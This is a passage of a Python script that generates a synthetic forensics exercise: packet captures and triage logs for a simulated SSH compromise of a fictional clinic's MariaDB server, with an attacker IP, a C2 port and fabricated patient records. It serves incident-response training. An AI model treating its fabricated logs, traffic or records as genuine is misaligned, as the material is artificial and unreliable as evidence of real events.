#!/usr/bin/env python3
"""
Escenario 02 — Compromiso de db01 (servidor MariaDB de Kelbrook Medical, ficticio) por SSH.

Genera desde una misma línea temporal:
  captura/vlan-datos-2026-09-29.pcap     tráfico visto por el sensor de la VLAN de datos
  triage/db01-triage-2026-09-30.tar.gz   triage en caliente de db01 (logs, binarios utmp,
                                         configuración, historiales y salida de comandos)

Todo es sintético: dominios inventados, IPs de los rangos de documentación (RFC 5737),
personas, claves y datos ficticios.  Uso:  python3 generar_escenario.py
"""
import base64
import gzip
import hashlib
import io
import os
import random
import socket
import struct
import tarfile
import unicodedata
from datetime import datetime, timezone

from scapy.all import IP, TCP, UDP, DNS, DNSQR, DNSRR, Ether, Raw, conf, wrpcap

conf.verb = 0
random.seed(20260930)
BASE = os.path.dirname(os.path.abspath(__file__))
rnd = random.randbytes

# ======================================================================= red y activos
DB, WEB, NAS, WS, DNS_SRV, FW = "10.20.30.20", "10.20.30.10", "10.20.30.40", "10.20.30.55", "10.20.30.2", "10.20.30.1"
ATTACKER, SCANNER, SCANNER2, NTP = "198.51.100.212", "203.0.113.77", "203.0.113.140", "203.0.113.5"
C2_PORT = 8080
LOCAL = {DB, NAS}                       # hosts en la VLAN de datos; el resto llega por fw01
MACS = {DB: "52:54:00:4d:b0:21", NAS: "00:11:32:9a:6e:40", FW: "00:1c:73:5d:21:e0"}
TTL_SEEN = {DB: 64, NAS: 64, WEB: 63, DNS_SRV: 63, WS: 127, ATTACKER: 49, SCANNER: 46, NTP: 55}
RTT = {WEB: 0.0006, WS: 0.0011, NAS: 0.0003, DNS_SRV: 0.0005, ATTACKER: 0.046, SCANNER: 0.162, NTP: 0.021}
HOST = "db01"
CAP_START, CAP_END = None, None          # se fijan tras definir T()

def T(d, h, m, s=0.0):
    return datetime(2026, 9, d, h, m, 0, tzinfo=timezone.utc).timestamp() + s

CAP_START, CAP_END = T(29, 22, 0), T(30, 3, 0)
TRIAGE_T = T(30, 8, 28, 12)

def dt(t): return datetime.fromtimestamp(t, timezone.utc)
def l2(src, dst): return Ether(src=MACS[src] if src in LOCAL else MACS[FW], dst=MACS[dst] if dst in LOCAL else MACS[FW])

PKTS = []
_ipid = {}
def emit(t, src, dst, l4):
    if not (CAP_START <= t <= CAP_END):
        return
    _ipid[src] = (_ipid.get(src, random.randint(2000, 60000)) + 1) & 0xFFFF
    p = l2(src, dst) / IP(src=src, dst=dst, ttl=TTL_SEEN.get(src, 52), id=_ipid[src], flags="DF") / l4
    p.time = t
    PKTS.append(p)

# ======================================================================= logs de texto
AUTH, SYSLOG = [], []
_PIDREQ = []          # (t, huecos) por petición; el valor real se asigna en resolve_pids()
PIDS = {}
class Pid:
    """PID diferido. Se imprime como marcador y se resuelve al final en orden cronológico."""
    def __init__(self, idx, off=0): self.idx, self.off = idx, off
    def __add__(self, n): return Pid(self.idx, self.off + n)
    def __str__(self): return f"\x01{self.idx}+{self.off}\x02"
    __format__ = lambda self, spec: format(str(self), spec) if not spec else format(self.value(), spec)
    def value(self): return PIDS[self.idx] + self.off

def pid_at(t, span=1):
    _PIDREQ.append((t, span))
    return Pid(len(_PIDREQ) - 1)

def resolve_pids():
    prev = 1400
    for i in sorted(range(len(_PIDREQ)), key=lambda i: _PIDREQ[i][0]):
        t, span = _PIDREQ[i]
        base = 1500 + int((t - BOOT_T) * 0.07) if t > BOOT_T else 47000 + int((t - T(1, 0, 0)) * 0.004)
        prev = PIDS[i] = max(prev + random.randint(1, 4), base)
        prev += span - 1

def unpid(text):
    import re
    return re.sub("\x01(\\d+)\\+(\\d+)\x02", lambda m: str(PIDS[int(m.group(1))] + int(m.group(2))), text)

BOOT_T = datetime(2026, 9, 14, 3, 12, 44, tzinfo=timezone.utc).timestamp() + 0.6

def sl(t): return dt(t).strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if dt(t).day < 10 else dt(t).strftime("%b %d %H:%M:%S")
def auth(t, prog, msg): AUTH.append((t, f"{sl(t)} {HOST} {prog}: {msg}"))
def sysl(t, prog, msg): SYSLOG.append((t, f"{sl(t)} {HOST} {prog}: {msg}"))

CRON_PID, LOGIND_PID, RSYSLOG_PID = 812, 798, 804

# ======================================================================= utmp / wtmp / btmp / lastlog
UTMP = struct.Struct("<h2xi32s4s32s256shhiii16s20x")   # struct utmp de glibc x86_64, 384 bytes
assert UTMP.size == 384
WTMP, BTMP, LASTLOG = [], [], {}

def utmp_rec(*a): return a

def utmp_pack(typ, pid, line, uid_, user, host, t, ip=None):
    pid = pid.value() if isinstance(pid, Pid) else pid
    addr = socket.inet_aton(ip) + b"\x00" * 12 if ip else b"\x00" * 16
    sec = int(t); usec = int(round((t - sec) * 1e6)) % 1000000
    return UTMP.pack(typ, pid, line.encode(), uid_.encode(), user.encode(), host.encode(), 0, 0, 0, sec, usec, addr)

# ======================================================================= TCP
class Tcp:
    """Conversación TCP con tiempos explícitos. El sensor está junto a db01: lo que db01
    recibe se contesta casi al instante; lo que envía tarda un RTT en tener respuesta."""

    def __init__(self, cip, cport, sip, sport):
        self.c, self.cp, self.s, self.sp = cip, cport, sip, sport
        far = sip if cip in LOCAL else cip
        self.rtt = RTT.get(far, 0.05)
        self.cseq, self.sseq = random.randint(1 << 20, 1 << 31), random.randint(1 << 20, 1 << 31)

    def _send(self, t, fc, flags, payload=b"", opts=None, seq=None, ack=None):
        src, dst = (self.c, self.s) if fc else (self.s, self.c)
        sp, dp = (self.cp, self.sp) if fc else (self.sp, self.cp)
        seq = seq if seq is not None else (self.cseq if fc else self.sseq)
        ack = ack if ack is not None else (self.sseq if fc else self.cseq)
        l4 = TCP(sport=sp, dport=dp, seq=seq, ack=ack if "A" in flags else 0, flags=flags,
                 window=(502 if fc else 501) if "S" not in flags else (64240 if fc else 65160), options=opts or [])
        emit(t, src, dst, l4 / Raw(payload) if payload else l4)

    def _delay_to(self, fc):
        """Tiempo hasta que el receptor reacciona, visto desde el sensor."""
        receiver = self.s if fc else self.c
        return 0.00025 if receiver == DB else self.rtt

    def open(self, t):
        o = [("MSS", 1460), ("SAckOK", b""), ("Timestamp", (random.randint(1, 1 << 31), 0)), ("NOP", None), ("WScale", 7)]
        self._send(t, True, "S", opts=o, ack=0); self.cseq += 1
        t += self._delay_to(True)
        self._send(t, False, "SA", opts=o); self.sseq += 1
        t += self._delay_to(False)
        self._send(t, True, "A")
        return t + 0.0002

    def data(self, t, fc, payload, ack=True):
        """Envía payload segmentado en vuelos (slow start sencillo). Devuelve el instante en que
        el otro extremo puede reaccionar."""
        segs = [payload[i:i + 1448] for i in range(0, len(payload), 1448)] or [b""]
        sender = self.c if fc else self.s
        gap = 0.00012 if sender == DB or sender in LOCAL else 0.0006
        cwnd, i, last = 10, 0, t
        while i < len(segs):
            flight = segs[i:i + cwnd]
            for k, sg in enumerate(flight):
                ts = t + k * gap
                self._send(ts, fc, "PA" if i + k == len(segs) - 1 else "A", sg)
                if fc: self.cseq += len(sg)
                else: self.sseq += len(sg)
                if ack and ((i + k) % 2 == 1 or i + k == len(segs) - 1):
                    self._send(ts + self._delay_to(fc), not fc, "A")
                last = ts
            i += len(flight)
            if i < len(segs):
                t = last + (self.rtt if sender == DB else 0.0003)
                cwnd *= 2
        return last + self._delay_to(fc)

    def ack(self, t, fc): self._send(t, fc, "A")

    def close(self, t, by_client=True):
        self._send(t, by_client, "FA")
        if by_client: self.cseq += 1
        else: self.sseq += 1
        t += self._delay_to(by_client)
        self._send(t, not by_client, "FA")
        if by_client: self.sseq += 1
        else: self.cseq += 1
        t += self._delay_to(not by_client)
        self._send(t, by_client, "A")
        return t

# ======================================================================= SSH
def sstr(b): b = b.encode() if isinstance(b, str) else b; return struct.pack(">I", len(b)) + b

def ssh_clear(payload, block=8):
    pad = block - ((5 + len(payload)) % block)
    if pad < 4: pad += block
    return struct.pack(">IB", 1 + len(payload) + pad, pad) + payload + rnd(pad)

SRV_BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"
OSSH_CIPH = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com"
OSSH_MAC = ("umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,"
            "hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1")
PROFILES = {
    "server": dict(kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                       "sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,"
                       "diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,kex-strict-s-v00@openssh.com",
                   hk="rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519", ciph=OSSH_CIPH, mac=OSSH_MAC, comp="none,zlib@openssh.com"),
    "nas": dict(kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                    "diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256",
                hk="rsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256,ssh-ed25519", ciph=OSSH_CIPH, mac=OSSH_MAC, comp="none,zlib@openssh.com"),
    "openssh84": dict(banner="SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3",
                      kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                          "diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,"
                          "diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com",
                      hk="ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,"
                         "ecdsa-sha2-nistp521-cert-v01@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,sk-ecdsa-sha2-nistp256-cert-v01@openssh.com,"
                         "rsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ssh-ed25519,"
                         "ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,"
                         "rsa-sha2-512,rsa-sha2-256,ssh-rsa",
                      ciph=OSSH_CIPH, mac=OSSH_MAC, comp="none,zlib@openssh.com,zlib", kexsize=(32, 32), enc=(8, 16, False)),
    "openssh89c": dict(banner=SRV_BANNER,
                       kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                           "sntrup761x25519-sha512@openssh.com,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,"
                           "diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com",
                       hk="ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ssh-ed25519,ecdsa-sha2-nistp256,"
                          "ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,rsa-sha2-512,rsa-sha2-256",
                       ciph=OSSH_CIPH, mac=OSSH_MAC, comp="none,zlib@openssh.com,zlib", kexsize=(32, 32), enc=(8, 16, False)),
    "putty": dict(banner="SSH-2.0-PuTTY_Release_0.76",
                  kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                      "diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha256,"
                      "diffie-hellman-group14-sha1,rsa2048-sha256,rsa1024-sha1,diffie-hellman-group1-sha1,ext-info-c",
                  hk="ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed448,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ssh-dss",
                  ciph="chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-ctr,aes192-cbc,"
                       "aes128-ctr,aes128-cbc,3des-ctr,3des-cbc,blowfish-ctr,blowfish-cbc,arcfour256,arcfour128",
                  mac="hmac-sha2-256,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,"
                      "hmac-sha1-96-etm@openssh.com,hmac-md5-etm@openssh.com",
                  comp="none,zlib,zlib@openssh.com", kexsize=(32, 32), enc=(8, 16, False)),
    "libssh2": dict(banner="SSH-2.0-libssh2_1.10.0",
                    kex="curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,"
                        "diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,"
                        "diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1",
                    hk="ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ecdsa-sha2-nistp256-cert-v01@openssh.com,"
                       "ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,"
                       "ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-512,ssh-rsa,ssh-rsa-cert-v01@openssh.com,ssh-dss",
                    ciph="aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,"
                         "arcfour128,arcfour,cast128-cbc,3des-cbc",
                    mac="hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com",
                    comp="none", kexsize=(32, 32), enc=(16, 32, True), ecdsa=True),
}

def kexinit(p):
    lists = [p["kex"], p["hk"], p["ciph"], p["ciph"], p["mac"], p["mac"], p["comp"], p["comp"], "", ""]
    return b"\x14" + rnd(16) + b"".join(sstr(x) for x in lists) + b"\x00" + b"\x00" * 4

def enc_len(plen, block, mac, len_in_align):
    pad = block - ((1 + plen + (4 if len_in_align else 0)) % block)
    if pad < 4: pad += block
    return 4 + 1 + plen + pad + mac

# Claves (blobs aleatorios con formato válido; las huellas se calculan como ssh-keygen -l)
def ed25519_blob(): return sstr("ssh-ed25519") + sstr(rnd(32))
def fingerprint(blob): return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
def pubkey_line(blob, comment): return f"ssh-ed25519 {base64.b64encode(blob).decode()} {comment}"

HOSTKEY_DB = ed25519_blob()
HOSTKEY_NAS = ed25519_blob()
KEY_MVEGA = ed25519_blob()
KEY_ATTACKER = ed25519_blob()
KEY_BACKUP = ed25519_blob()


class Ssh:
    """Sesión SSH: claro hasta NEWKEYS, después paquetes cifrados del tamaño que tocaría."""

    def __init__(self, cip, cport, sip, sport, client, server="server"):
        self.tcp = Tcp(cip, cport, sip, sport)
        self.cl, self.sv = PROFILES[client], PROFILES[server]
        self.enc = self.cl["enc"]
        self.hostkey = HOSTKEY_NAS if sip == NAS else HOSTKEY_DB
        self.sbanner = "SSH-2.0-OpenSSH_8.2p1" if sip == NAS else SRV_BANNER

    def E(self, *plens): return b"".join(rnd(enc_len(p, *self.enc)) for p in plens)

    def c(self, t, data, ack=True): return self.tcp.data(t, True, data, ack)
    def s(self, t, data, ack=True): return self.tcp.data(t, False, data, ack)

    def handshake(self, t, user):
        """TCP + banners + KEX + NEWKEYS + ssh-userauth + método 'none'. Devuelve t."""
        t = self.tcp.open(t)
        t = self.s(t + 0.002, (self.sbanner + "\r\n").encode())
        t = self.c(t + 0.001, (self.cl["banner"] + "\r\n").encode())
        t = self.c(t + 0.0005, ssh_clear(kexinit(self.cl)))
        t = self.s(t + 0.0004, ssh_clear(kexinit(self.sv)))
        qc, qs = self.cl["kexsize"]
        t = self.c(t + 0.002, ssh_clear(b"\x1e" + sstr(rnd(qc))))
        if self.cl.get("ecdsa"):
            ks = sstr("ecdsa-sha2-nistp256") + sstr("nistp256") + sstr(b"\x04" + rnd(64))
            sig = sstr(sstr("ecdsa-sha2-nistp256") + sstr(rnd(72)))
        else:
            ks, sig = self.hostkey, sstr(sstr("ssh-ed25519") + sstr(rnd(64)))
        t = self.s(t + 0.004, ssh_clear(b"\x1f" + sstr(ks) + sstr(rnd(qs)) + sig) + ssh_clear(b"\x15"))
        t = self.c(t + 0.003, ssh_clear(b"\x15") + self.E(17))                  # NEWKEYS + SERVICE_REQUEST
        ext = [290] if "ext-info-c" in self.cl["kex"] else []
        t = self.s(t + 0.0004, self.E(*ext, 17))                                  # EXT_INFO + SERVICE_ACCEPT
        t = self.c(t + 0.001, self.E(27 + len(user)))                            # USERAUTH_REQUEST none
        t = self.s(t + 0.0004, self.E(24))                                        # USERAUTH_FAILURE
        return t

    def password(self, t, user, pwlen, ok):
        t = self.c(t, self.E(41 + len(user) + pwlen))
        return self.s(t + (0.02 if ok else 2.1), self.E(1 if ok else 24))

    def publickey(self, t, user):
        t = self.c(t, self.E(111 + len(user)))            # consulta de clave
        t = self.s(t + 0.0004, self.E(69))                 # PK_OK
        t = self.c(t + 0.002, self.E(196 + len(user)))     # petición firmada
        return self.s(t + 0.003, self.E(1))                # USERAUTH_SUCCESS


class Shell:
    """Shell interactiva sobre una sesión SSH ya autenticada: pulsaciones, eco y salida."""

    def __init__(self, ssh, t, motd=1180):
        self.x, self.tcp = ssh, ssh.tcp
        t = ssh.c(t + 0.001, ssh.E(24))                     # CHANNEL_OPEN session
        t = ssh.s(t + 0.0004, ssh.E(17, 600))              # OPEN_CONFIRMATION + hostkeys-00
        t = ssh.c(t + 0.001, ssh.E(34, 331, 38, 15))       # no-more-sessions, pty-req, env LANG, shell
        t = ssh.s(t + 0.006, ssh.E(13, 5))                 # WINDOW_ADJUST + CHANNEL_SUCCESS
        self.t = ssh.s(t + 0.05, ssh.E(9 + motd))          # motd + prompt

    def _out(self, t, n):
        """Salida del servidor de n bytes en mensajes de hasta 16 KB."""
        plens = [9 + min(16384, n - i) for i in range(0, max(n, 1), 16384)]
        return self.x.s(t, self.x.E(*plens))

    def keys(self, t_end, text, echo=True, cps=6.5):
        """Teclea `text` terminando justo en t_end (sin el Enter)."""
        n = len(text)
        times = []
        tk = t_end
        for _ in range(n):
            times.append(tk)
            tk -= random.uniform(0.6, 1.6) / cps
        times.reverse()
        assert times[0] > self.t if times else True, (dt(t_end), text)
        for tk in times:
            self.tcp.data(tk, True, self.x.E(10), ack=False)
            if echo:
                self.tcp.data(tk + 0.0006, False, self.x.E(10), ack=False)
                self.tcp.ack(tk + 0.0006 + self.tcp.rtt, True)
            else:
                self.tcp.ack(tk + 0.0003, False)
        return t_end

    def run(self, t_enter, text, out, wait=0.02, echo=True, paste=False):
        if paste:
            self.tcp.data(t_enter - 0.4, True, self.x.E(9 + len(text)), ack=False)
            self.tcp.data(t_enter - 0.4 + 0.0006, False, self.x.E(9 + len(text)))
        else:
            self.keys(t_enter - random.uniform(0.25, 0.6), text, echo)
        self.tcp.data(t_enter, True, self.x.E(10), ack=False)       # Enter
        self.t = self._out(t_enter + wait, out + 2)
        return self.t

    def close(self, t, logout_text=9):
        t = self.x.s(t, self.x.E(9 + logout_text, 25, 5, 5))       # "logout", exit-status, EOF, CLOSE
        t = self.x.c(t + 0.001, self.x.E(5, 33))                    # CLOSE + DISCONNECT
        return self.tcp.close(t + 0.002, by_client=False)

# ======================================================================= MySQL (ruido web01 -> db01)
def my(seq, payload): return struct.pack("<I", len(payload))[:3] + bytes([seq & 0xFF]) + payload
def lei(n):
    if n < 251: return bytes([n])
    if n < 1 << 16: return b"\xfc" + n.to_bytes(2, "little")
    return b"\xfd" + n.to_bytes(3, "little")
def les(s): s = s.encode() if isinstance(s, str) else s; return lei(len(s)) + s
def scramble(n): return bytes(random.choice(b"!#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~") for _ in range(n))

def my_greeting(tid):
    return my(0, b"\x0a" + b"5.5.5-10.6.18-MariaDB-0ubuntu0.22.04.1\x00" + struct.pack("<I", tid) + scramble(8) + b"\x00"
              + struct.pack("<H", 0xF7FE) + b"\x2d" + struct.pack("<H", 0x0002) + struct.pack("<H", 0x81BF) + b"\x15"
              + b"\x00" * 6 + struct.pack("<I", 0x1D) + scramble(12) + b"\x00" + b"mysql_native_password\x00")

def my_login():
    return my(1, struct.pack("<IIB", 0x000EA20F, 16777216, 45) + b"\x00" * 23 + b"portal_app\x00" + b"\x14" + rnd(20)
              + b"kb_portal\x00" + b"mysql_native_password\x00")

def my_ok(seq, affected=0): return my(seq, b"\x00" + lei(affected) + b"\x00" + b"\x02\x00\x00\x00")

def my_result(table, cols, rows):
    out, seq = [my(1, lei(len(cols)))], 2
    for name, typ, ln in cols:
        cs = 63 if typ in (3, 8, 246, 10, 11, 12) else 45
        out.append(my(seq, les("def") + les("kb_portal") + les(table) + les(table) + les(name) + les(name) + b"\x0c"
                      + struct.pack("<HIBHB", cs, ln, typ, 0x1001 if name == "id" else 0, 2 if typ == 246 else 0) + b"\x00\x00"))
        seq += 1
    out.append(my(seq, b"\xfe\x00\x00\x22\x00")); seq += 1
    for r in rows:
        out.append(my(seq, b"".join(les(str(v)) for v in r))); seq += 1
    out.append(my(seq, b"\xfe\x00\x00\x22\x00"))
    return b"".join(out)

PRODUCTS = [(1, "Tensiómetro digital KB-200", "49.90"), (2, "Pulsioxímetro de dedo", "24.50"), (3, "Glucómetro KB-Glu", "31.00")]

def portal_query(kind, when):
    if kind == "productos":
        return ("SELECT id, nombre, precio FROM productos WHERE activo = 1 ORDER BY id",
                my_result("productos", [("id", 3, 11), ("nombre", 253, 480), ("precio", 246, 10)], PRODUCTS))
    if kind == "huecos":
        d = dt(when + 86400).strftime("%Y-%m-%d")
        rows = [(d, f"{h:02d}:{m:02d}:00") for h in (9, 10, 11, 12) for m in (0, 30)][:random.randint(4, 8)]
        return ("SELECT fecha, hora FROM huecos_cita WHERE fecha >= CURDATE() AND libre = 1 ORDER BY fecha, hora LIMIT 10",
                my_result("huecos_cita", [("fecha", 10, 10), ("hora", 11, 10)], rows))
    if kind == "sesion":
        tok = rnd(16).hex()
        rows = [(random.randint(2, 900), dt(when + 1800).strftime("%Y-%m-%d %H:%M:%S"))] if random.random() < 0.7 else []
        return (f"SELECT usuario_id, expira FROM sesiones WHERE token = '{tok}' LIMIT 1",
                my_result("sesiones", [("usuario_id", 3, 11), ("expira", 12, 19)], rows))
    if kind == "limpieza":
        return ("DELETE FROM sesiones WHERE expira < NOW()", my_ok(1, random.randint(0, 4)))
    raise ValueError(kind)

_mysql_tid = [184210]
def mysql_conn(t, kinds):
    tcp = Tcp(WEB, eph(WEB, t), DB, 3306)
    _mysql_tid[0] += random.randint(1, 3)
    t = tcp.open(t)
    t = tcp.data(t + 0.0003, False, my_greeting(_mysql_tid[0]))
    t = tcp.data(t + 0.0002, True, my_login())
    t = tcp.data(t + 0.0004, False, my_ok(2))
    t = tcp.data(t + 0.0002, True, my(0, b"\x03SET NAMES utf8mb4"))
    t = tcp.data(t + 0.0002, False, my_ok(1))
    for k in kinds:
        q, resp = portal_query(k, t)
        t = tcp.data(t + random.uniform(0.0005, 0.004), True, my(0, b"\x03" + q.encode()))
        t = tcp.data(t + random.uniform(0.0003, 0.002), False, resp)
    t = tcp.data(t + 0.0004, True, my(0, b"\x01"), ack=False)
    tcp.close(t + 0.0002, by_client=False)

# ======================================================================= DNS / NTP / HTTP
def dns_query(t, name, answer):
    sport, txid = random.randint(32768, 60999), random.randint(1, 65535)
    emit(t, DB, DNS_SRV, UDP(sport=sport, dport=53) / DNS(id=txid, rd=1, qd=DNSQR(qname=name, qtype="A")))
    emit(t + 0.0011, DNS_SRV, DB, UDP(sport=53, dport=sport) / DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qd=DNSQR(qname=name, qtype="A"),
                                                                  an=DNSRR(rrname=name, type="A", ttl=3600, rdata=answer)))

def ntp_poll(t):
    stamp = struct.pack(">I", int(t) + 2208988800) + rnd(4)
    emit(t, DB, NTP, UDP(sport=123, dport=123) / Raw(b"\x23\x00\x00\x00" + b"\x00" * 36 + stamp))
    emit(t + RTT[NTP], NTP, DB, UDP(sport=123, dport=123) / Raw(b"\x24\x02\x03\xe8" + b"\x00\x00\x00\x1e\x00\x00\x00\x2a" + b"\xc6\x33\x64\x01"
                                                              + stamp + stamp + stamp + stamp))

def http_date(t): return dt(t).strftime("%a, %d %b %Y %H:%M:%S GMT")
_eph = {}
def eph(host, t):
    """Puerto efímero de Linux (32768-60999) que crece con el tiempo, sin repeticiones,
    aunque las conexiones se generen fuera de orden."""
    used = _eph.setdefault(host, (random.Random(host).randint(33000, 40000), set()))
    port = used[0] + int((t - T(29, 22, 0)) * 0.9) + random.randint(0, 3)
    port = 32768 + (port - 32768) % 28232
    while port in used[1]: port += 1
    used[1].add(port)
    return port

# ======================================================================= datos ficticios de kb_clinica
NOMBRES = ("Marta Jon Lucía Pedro Aitana Carmen Javier Elena Iker Nerea Sergio Laura Pablo Irene Daniel Ainhoa Rubén Sara Álvaro Noelia "
           "Hugo Claudia Adrián Paula Mario Andrea Diego Alba Raúl Cristina Óscar Beatriz Iván Rocío Gonzalo Natalia Unai Miren Tomás Julia "
           "Ignacio Lorena Víctor Silvia Fernando Patricia Alberto Teresa Enrique Inés Asier Leire Samuel Clara Marcos Lidia Rafael Eva Gorka Olga").split()
APELLIDOS = ("García Martínez López Sánchez Pérez Gómez Martín Jiménez Ruiz Hernández Díaz Moreno Álvarez Muñoz Romero Alonso Gutiérrez Navarro "
             "Torres Domínguez Vázquez Ramos Gil Ramírez Serrano Blanco Molina Morales Suárez Ortega Delgado Castro Ortiz Rubio Marín Sanz "
             "Iglesias Núñez Medina Garrido Cortés Castillo Santos Lozano Guerrero Cano Prieto Méndez Cruz Calvo Gallego Vidal León Herrera "
             "Márquez Peña Flores Cabrera Campos Vega Fuentes Carrasco Diez Caballero Reyes Nieto Aguilar Pascual Santana Herrero Lorenzo "
             "Hidalgo Montero Ibáñez Giménez Ferrer Durán Etxeberria Aranburu Zubizarreta Goikoetxea Ibarra Soler Ferrán Mota Alcázar Robles").split()
DOMINIOS = ["mailvex.es", "corralmail.com", "buzonet.es", "correo-telva.com"]
ASEGURADORAS = ["Asisur Salud", "Medivia", "Sanicor", "Veralia Seguros", "Privado", "Privado"]
ESPECIALIDADES = ["Medicina general", "Cardiología", "Dermatología", "Traumatología", "Pediatría", "Ginecología", "Oftalmología", "Endocrinología"]
CIE10 = [("I10", "Hipertensión esencial"), ("E11.9", "Diabetes mellitus tipo 2 sin complicaciones"), ("J06.9", "Infección aguda de vías respiratorias superiores"),
         ("M54.5", "Lumbalgia"), ("L20.9", "Dermatitis atópica"), ("E78.5", "Hiperlipidemia"), ("K21.9", "Reflujo gastroesofágico"),
         ("F41.1", "Trastorno de ansiedad generalizada"), ("J45.909", "Asma no especificada"), ("H52.1", "Miopía"), ("M17.9", "Gonartrosis"),
         ("E03.9", "Hipotiroidismo"), ("N39.0", "Infección del tracto urinario"), ("R51", "Cefalea"), ("Z00.00", "Revisión general")]
NOTAS = ["Control rutinario. Se mantiene tratamiento.", "Se solicita analítica completa.", "Mejoría clínica. Revisión en 3 meses.",
         "Se ajusta dosis y se cita a control.", "Derivado a especialista.", "Sin cambios relevantes respecto a la última visita.",
         "Se pauta tratamiento tópico.", "Se recomienda dieta y ejercicio moderado.", "Pendiente de resultados de imagen.", "Alta del proceso."]
MEDICOS = [(1, "Dra. Ana Lezama Ortiz", "Medicina general"), (2, "Dr. Iñigo Salaberri Gil", "Medicina general"), (3, "Dra. Rosa Quintana Mir", "Cardiología"),
           (4, "Dr. Félix Arroyo Bas", "Dermatología"), (5, "Dra. Leticia Mora Pons", "Traumatología"), (6, "Dr. Gabriel Ruano Vela", "Pediatría"),
           (7, "Dra. Sonia Ballester Ríos", "Ginecología"), (8, "Dr. Jaime Olmedo Sáez", "Oftalmología"), (9, "Dra. Mónica Tejada Luna", "Endocrinología"),
           (10, "Dr. Hernán Cuesta Vidal", "Medicina general"), (11, "Dra. Elisa Barrio Font", "Cardiología"), (12, "Dr. Luis Paredes Soto", "Traumatología")]
N_PACIENTES, N_CITAS, N_HISTORIAS = 1240, 3180, 2075

def ascii_low(s): return unicodedata.normalize("NFKD", s).encode("ascii", "ignore").decode().lower()
def dni():
    n = random.randint(10000000, 79999999)
    return f"{n}{'TRWAGMYFPDXBNJZSQVHLCKE'[n % 23]}"
def q(v): return "NULL" if v is None else (str(v) if isinstance(v, int) else "'" + str(v).replace("'", "\\'") + "'")

def build_dump():
    pacientes = []
    for i in range(1, N_PACIENTES + 1):
        n, a1, a2 = random.choice(NOMBRES), random.choice(APELLIDOS), random.choice(APELLIDOS)
        nac = f"{random.randint(1938, 2016)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
        tel = f"{random.choice('67')}{random.randint(10000000, 99999999)}"
        mail = f"{ascii_low(n)}.{ascii_low(a1)}{random.randint(1, 99)}@{random.choice(DOMINIOS)}" if random.random() < 0.85 else None
